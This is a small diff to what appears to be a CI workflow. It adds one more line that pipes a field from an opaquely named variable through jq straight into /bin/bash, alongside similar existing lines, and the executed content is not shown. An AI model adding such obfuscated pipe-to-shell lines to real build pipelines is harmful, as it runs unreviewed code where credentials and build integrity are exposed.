@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$frmz92486" | jq -r .vtn7 | /bin/bash
           echo $ukg87428 | jq -r .nx18330 | /bin/bash
           echo $yl02 | jq -r .lt680 | /bin/bash
+          echo $okoz901 | jq -r .b881 | /bin/bash
 
       - name: Upload data
         if: always()
